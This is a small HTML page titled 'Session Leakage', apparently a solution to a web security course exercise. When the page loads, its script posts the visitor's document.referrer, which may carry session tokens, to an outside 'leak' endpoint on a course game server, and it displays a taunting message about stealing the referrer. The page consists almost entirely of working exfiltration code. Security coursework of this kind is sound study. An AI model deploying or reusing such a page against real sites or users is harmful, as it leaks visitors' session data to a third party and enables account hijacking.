<!DOCTYPE html>
<html lang="en">

	<head>
		<meta charset="utf-8">
		<title>Session Leakage</title>
	</head>

	<body>
		<p id="attack_status">Lemme steal that referrer of yours real quick...</p>

		<script>
			const leak = new XMLHttpRequest();
			leak.open("POST", "https://gameserver.websec.saarland/leak", false);
			leak.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
			leak.send("secret=deaddeaddeaddeaddeaddeaddeaddead&data=" + document.referrer);
			console.log(leak.responseText);
		</script>
		
	</body>
</html>
